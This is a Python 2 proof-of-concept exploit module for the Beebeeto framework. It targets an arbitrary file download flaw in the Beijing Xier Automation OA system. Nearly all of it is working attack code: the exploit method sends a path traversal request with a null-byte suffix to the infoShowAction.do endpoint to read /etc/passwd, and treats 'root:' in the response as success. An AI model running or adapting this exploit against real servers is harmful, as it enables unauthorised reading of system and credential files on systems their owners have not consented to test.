#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0163',
            'name': '北京希尔自动化OA管理系统/数据库系统 /bnuoa/info/infoShowAction.do 任意文件下载漏洞 Exploit',
            'author': '雷锋',
            'create_date': '2014-11-23',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'OA',
            'vul_version': ['*'],
            'type': 'Arbitrary File Download',
            'tag': ['希尔自动化OA漏洞', '任意文件下载漏洞', 'bnuoa/info/infoShowAction.do', 'Linux版本'],
            'desc': 'N/A',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-058386',
            ]
        },
    }


    @classmethod
    def exploit(cls, args):
        verify_url = args['options']['target'] + ('/bnuoa/info/infoShowAction.do?accessory=1&id='
                                                  '../../../../../../../../../../etc/passwd%00.jpg&method=getAccessory')
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "root:" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())